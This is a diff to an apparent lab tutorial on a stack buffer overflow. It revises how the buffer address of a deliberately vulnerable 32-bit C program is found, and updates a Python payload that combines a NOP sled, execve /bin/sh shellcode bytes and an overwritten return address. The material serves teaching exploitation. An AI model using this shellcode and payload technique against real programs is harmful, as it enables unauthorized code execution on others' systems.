@@ -112,7 +112,7 @@ We compile the code while allowing the stack to be executable (another safety me
 
 ```shell
 cd /vagrant/attack2
-gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack
+gcc -g vuln.c -o vuln -fno-stack-protector -m32 -z execstack
 ```
 
 - `-z execstack` makes the stack executable
@@ -157,55 +157,38 @@ print "a"*108
 
 At this stage, we know that this program has a vulnerability and we will try to exploit it.
 
-### Finding the address where the buffer starts
+### Determining the address where the buffer starts
 
-We know that the buffer starts 108 bytes before %ebp. But, how do we know the value of %ebp once the function `func` is executed? That’s where GDB will help us. Since ASRL is disabled, we are sure that no matter how many times the binary is run, the address of the buffer will not change.
+We know that the buffer starts 108 bytes before %ebp. But, how do we know the exact address of the buffer? Since ASRL is disabled, we are sure that no matter how many times the binary is run, the address of the buffer will not change.
 
-1. Start GDB
-    ```
-    $ gdb -q vuln
-    Reading symbols from vuln...(no debugging symbols found)...done.
-    ```
+To find the exact address, one simple method consists in instrumenting the code to show this value. Therefore, we can modify the code as follows:
 
-2. Add a breakpoint at the function called `func`
-    ```
-    (gdb) break func
-    Breakpoint 1 at 0x8048456
-    ```
+```c
+void func(char *name)
+{
+    char buf[100];
+    strcpy(buf, name);
+    printf("Welcome %s\n", buf);
+    printf("%p\n",(void*)&buf);
+}
+```
 
-3. Run the program
-    ```
-    (gdb) run $(python test.py)
-    Starting program: /vagrant/shellcode_injection/vuln $(python test.py)
-    Breakpoint 1, 0x08048456 in func ()
-    ```
+Executing the program shows the buffer address `0xffffd54c`:
 
-4. Print %ebp
-    ```
-    (gdb) print $ebp
-    $1 = (void *) 0xffffd5e8
-    ```
-
-5. Print %ebp - 6c (baseed on our earlier observation)
-    ```
-    (gdb) print $ebp - 0x6c
-    $2 = (void *) 0xffffd57c
-    ```
-
-5. Quit GDB
-    ```
-    (gdb) quit
-    ```
-
-However this might not be the address of the buffer when we run the program outside of gdb. This is because things like environment variables and the name of the program along with arguments are also pushed on the stack. Although, the stack starts at the same address. The difference in the method of running the program will result in the difference of the address of the buffer. The difference will be around few bytes. Nevertheless, we know that the address is located somewhere around `0xffffd57c`.
+```shell
+$ ./vuln $(python attack_sol.py)
+Welcome ????????????????????????????????????????1?Ph//shh/bin??P??S??
+                                                                     ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`???
+0xffffd54c
+```
 
 ### Crafting the payload
 
-Now we know that 108 bytes are reserved for the buffer and that this buffer is located somewhere around `0xffffd57c`. At this stage, we do not need to know the exact location of the buffer, instead we will use a technique called a `NOP sled` to slide towards our shellcode in case the beginning of the buffer is not exactly at this location.
+Now we know that 108 bytes are reserved for the buffer and that this buffer is located somewhere around `0xffffd54c`. At this stage, we do not need to know the exact location of the buffer, instead we will use a technique called a `NOP sled` to slide towards our shellcode in case the beginning of the buffer is not exactly at this location.
 
 More precisely, a `NOP sled` is a sequence of NOP (no-operation) instructions meant to “slide” the CPU’s instruction execution flow to its final, desired, destination whenever the program branches to a memory address anywhere on the sled. Basically, whenever the CPU sees a NOP instruction, it slides down to the next instruction. The processor will keep on executing the NOP instructions until it finds the shellcode.
 
-Therefore, we decide to make the processor jump to the address of the buffer + 20 bytes (0xffffce0c + 20 = 0xffffce20) to get somewhere in the middle of the NOP sled.
+Therefore, we decide to make the processor jump to the address of the buffer + 20 bytes (0xffffd54c + 20 = 0xffffd560) to get somewhere in the middle of the NOP sled.
 Like the previous attack, we know that:
 
 - we have our 108 bytes buffer
@@ -222,7 +205,7 @@ The following script generate such a payload:
 
 ```python
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
-print "\x90"*40 + shellcode + "A"*47 + "\x20\xce\xff\xff"
+print "\x90"*40 + shellcode + "A"*47 + "\x60\xd5\xff\xff"
 ```
 
 and we can execute our program with this payload:
